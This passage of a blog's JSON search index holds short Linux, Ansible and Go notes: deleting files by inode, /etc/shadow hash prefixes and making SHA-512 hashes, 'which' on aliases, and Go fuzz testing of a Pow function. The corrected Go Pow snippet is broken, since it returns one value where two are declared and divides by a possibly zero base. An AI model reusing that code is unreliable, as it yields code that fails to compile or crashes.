style=\"color:#ae81ff\"\u003e4\u003c/span\u003e Nov  \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e 06:27\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ewe can delete the desired file by passing its inode number to the -inum switch of the find command\u003c/p\u003e","tags":["URL","Linux","SHELL","command line"],"title":"How to Delete Files With Names That Contain Non-printable Characters"},{"categories":["URL","Linux","SHELL","command line"],"contents":" /etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes chage and Password Aging chage --list root Last password change : Oct 01, 2022 Password expires : never Password inactive : never Account expires : never Minimum number of days between password change : 0 Maximum number of days between password change : 99999 Number of days of warning before password expires : 7 Consequently, we can change any field via its associated flag:\n-d or --lastday for the last change date -m or --mindays for the days between password changes -M or --maxdays for the maximum password validity -W or --warndays for the warning period -I or --inactive for the inactivity period -E or --expiredate for the expiration period chpasswd and Passwords echo 'user1:PASSWORD' | chpasswd --crypt-method SHA512\ncrypt() and Encryption Algorithms Essentially, the initial characters of the password field value in /etc/shadow identify the encryption algorithm:\n$1$ is Message Digest 5 (MD5) $2a$ is blowfish $5$ is 256-bit Secure Hash Algorithm (SHA-256) $6$ is 512-bit Secure Hash Algorithm (SHA-512) $y$ (or $7$) is yescrypt noneof the above means DES Generate /etc/shadow Passwords OpenSSL support several types of hashing:\n-crypt for the standard UNIX crypt, i.e., DES (default) -apr1 for the Apache-specific MD5 variant -1 for MD5 -5 for SHA-256 -6 for SHA-512 # OpenSSL openssl passwd -6 PASSWORD $1$SALT$YQNBYRN9kIvLkQIp4SpsO0 # Perl perl -e \u0026#39;print crypt \u0026#34;PASSWORD\u0026#34;, \u0026#34;\\$6\\$SALT\\$\u0026#34;\u0026#39; $6$SALT$io0TPmhM8ythCm7Idt0AfYvTuFCLyA1CMVmeT3EUqarf2NQcTuLKEgP9.4Q8fgClzP7OCnyOY1wo1xDw0jtyH1 # Python python3 -c \u0026#39;import crypt; print(crypt.crypt(\u0026#34;PASSWORD\u0026#34;, \u0026#34;$6$SALT\u0026#34;))\u0026#39; $6$SALT$io0TPmhM8ythCm7Idt0AfYvTuFCLyA1CMVmeT3EUqarf2NQcTuLKEgP9.4Q8fgClzP7OCnyOY1wo1xDw0jtyH1 python3 -c \u0026#39;import crypt,getpass; print(crypt.crypt(\u0026#34;PASSWORD\u0026#34;,crypt.mksalt(crypt.METHOD_SHA512)))\u0026#39; python3 -c \u0026#39;import crypt,getpass; print(crypt.crypt(getpass.getpass(),crypt.mksalt(crypt.METHOD_SHA512)))\u0026#39; # Ruby ruby -e \u0026#39;puts \u0026#34;PASSWORD\u0026#34;.crypt(\u0026#34;$6$SALT\u0026#34;)\u0026#39; $6$SALT$io0TPmhM8ythCm7Idt0AfYvTuFCLyA1CMVmeT3EUqarf2NQcTuLKEgP9.4Q8fgClzP7OCnyOY1wo1xDw0jtyH1 # we can also use a random salt and stdin for the password entry ruby -e \u0026#39;require \u0026#34;io/console\u0026#34;; puts IO::console.getpass.crypt(\u0026#34;$6$\u0026#34; + rand(36 ** 8).to_s(36))\u0026#39; ","date":"November 14, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221114-shadow-passwords/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/shadow-passwords\" target=\"_blank\" rel=\"noopener\"\u003e/etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"chage-and-password-aging\"\u003echage and Password Aging\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echage --list root\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLast password change                                    : Oct 01, \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePassword expires                                        : never\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePassword inactive                                       : never\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAccount expires                                         : never\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMinimum number of days between password change          : \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMaximum number of days between password change          : \u003cspan style=\"color:#ae81ff\"\u003e99999\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNumber of days of warning before password expires       : \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eConsequently, we can change any field via its associated flag:\u003c/p\u003e","tags":["URL","Linux","SHELL","command line"],"title":"/etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes"},{"categories":["URL","Linux","SHELL","command line"],"contents":" How to Use which on an Aliased Command type type grep grep is an alias for grep --color=auto # Bash\u0026#39;s type type -P grep /usr/bin/grep # Zsh\u0026#39;s type type -p grep grep is /usr/bin/grep GNU which which -a which which: shell built-in command /usr/bin/which alias top10 top10=\u0026#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10\u0026#39; alias | /usr/bin/which -i top10 top10=\u0026#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10\u0026#39; /usr/bin/uniq /usr/bin/sort /usr/bin/head ","date":"November 10, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221110-which-on-an-aliased-command/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/which-on-an-aliased-command\" target=\"_blank\" rel=\"noopener\"\u003eHow to Use which on an Aliased Command\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"type\"\u003etype\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etype grep\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egrep is an alias \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e grep --color\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eauto\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Bash\u0026#39;s type\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etype -P grep\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/usr/bin/grep\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Zsh\u0026#39;s type\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etype -p grep\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egrep is /usr/bin/grep\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"gnu-which\"\u003eGNU which\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewhich -a which\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewhich: shell built-in command\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/usr/bin/which\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ealias top10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etop10\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;print -l  ${(o)history%% *} | uniq -c | sort -nr | head -n 10\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ealias | /usr/bin/which -i top10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etop10\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;print -l  ${(o)history%% *} | uniq -c | sort -nr | head -n 10\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t/usr/bin/uniq\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t/usr/bin/sort\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t/usr/bin/head\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","SHELL","command line"],"title":"How to Use which on an Aliased Command"},{"categories":["URL","Ansible"],"contents":" 將指令輸出轉為圖片 --- - name: Capture command output and convert to image hosts: all tasks: - name: Display content of /etc/redhat-release shell: cat /etc/redhat-release register: redhat_release_result - name: hostname shell: hostname register: hostname_result # 可以使用 ImageMagick 來轉換文字為圖片 - name: Convert command output as image shell: echo -e \u0026#34;{{ hostname_result.stdout }}\\n{{ redhat_release_result.stdout }}\u0026#34; | convert label:@- {{ hostname_result.stdout }}.png delegate_to: localhost ","date":"November 10, 2022","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221110-tip-command-output-to-image/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ansible.cloudns.pro/post/tips/tip-command-output-to-image/\" target=\"_blank\" rel=\"noopener\"\u003e將指令輸出轉為圖片\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCapture command output and convert to image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ehosts\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003etasks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eDisplay content of /etc/redhat-release\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eshell\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ecat /etc/redhat-release\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eregister\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eredhat_release_result\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ehostname\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eshell\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ehostname\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eregister\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ehostname_result\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 可以使用 ImageMagick 來轉換文字為圖片\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eConvert command output as image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eshell\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eecho -e \u0026#34;{{ hostname_result.stdout }}\\n{{ redhat_release_result.stdout }}\u0026#34; | convert label:@- {{ hostname_result.stdout }}.png\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003edelegate_to\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003elocalhost\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Ansible"],"title":"將指令輸出轉為圖片"},{"categories":["URL","Go","Testing"],"contents":" 善用 Go Fuzzing，幫助你寫出更完整的單元測試 func Pow(base uint, exponent uint) uint { if exponent == 0 { return 1 } return base * Pow(base, exponent-1) } func FuzzPow(f *testing.F) { f.Fuzz(func(t *testing.T, x, y uint) { assert := assert.New(t) assert.Equal(Pow(x, 0), uint(1)) assert.Equal(Pow(x, 1), x) assert.Equal(Pow(x, 2), x*x) if x \u0026gt; 0 \u0026amp;\u0026amp; y \u0026gt; 0 { assert.Equal(Pow(x, y)/x, Pow(x, y-1)) } }) } go test -fuzz=Fuzz -fuzztime 20s\n在做 Fuzzing Test 的時候如果跑一跑 FAIL 了，Go 會幫忙把那組 input 記在 testcase/ 裡面 看了之後會發現在 x=6、y=30 時 assert 會失敗，也就是說 pow(6, 30)/6 不會等於 pow(6, 29)。但這也太奇怪了吧？仔細實驗之後才發現是因為在計算 pow(6, 30) 的時候會發生 overflow。 因為 Go 定義的 max.MaxUint 大約是 18 * 10¹⁸，但 6²⁹ 大概是 7 * 10¹⁸。如果把 6²⁹ 再乘上 6，就會發生 overflow 得到 8 * 10¹⁸，很像繞了操場兩圈結果在跟原本差不多的位置。 var ErrOverflow = fmt.Errorf(\u0026#34;overflow\u0026#34;) func Pow(base uint, exponent uint) (uint, error) { if exponent == 0 { return 1 } prevResult, err := Pow(base, exponent-1) if math.MaxUint/base \u0026lt; prevResult { return 0, ErrOverflow } return base * prevResult, nil } func FuzzPow(f *testing.F) { f.Fuzz(func(t *testing.T, x, y uint) { assert := assert.New(t) if result, err := Pow(x, 1); err != ErrOverflow { assert.Equal(result, x) } if result, err := Pow(x, y); x \u0026gt; 0 \u0026amp;\u0026amp; y \u0026gt; 0 \u0026amp;\u0026amp; err != ErrOverflow { resultDivX, _ := Pow(x, y-1) assert.Equal(result/x, resultDivX) } }) } ","date":"November 3, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221103-utilize-go-fuzzing-to-write-better-unit-tests/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/starbugs/utilize-go-fuzzing-to-write-better-unit-tests-80bd37cd4e38\" target=\"_blank\" rel=\"noopener\"\u003e善用 Go Fuzzing，幫助你寫出更完整的單元測試\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eFuzzPow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eF\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFuzz\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e), uint(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e), \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e), \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  \t\u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003ego test -fuzz=Fuzz -fuzztime 20s\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在做 Fuzzing Test 的時候如果跑一跑 FAIL 了，Go 會幫忙把那組 input 記在 testcase/ 裡面\u003c/li\u003e\n\u003cli\u003e看了之後會發現在 x=6、y=30 時 assert 會失敗，也就是說 pow(6, 30)/6 不會等於 pow(6, 29)。但這也太奇怪了吧？仔細實驗之後才發現是因為在計算 pow(6, 30) 的時候會發生 overflow。\u003c/li\u003e\n\u003cli\u003e因為 Go 定義的 max.MaxUint 大約是 18 * 10¹⁸，但 6²⁹ 大概是 7 * 10¹⁸。如果把 6²⁹ 再乘上 6，就會發生 overflow 得到 8 * 10¹⁸，很像繞了操場兩圈結果在跟原本差不多的位置。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eErrOverflow\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eErrorf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;overflow\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e) (\u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan 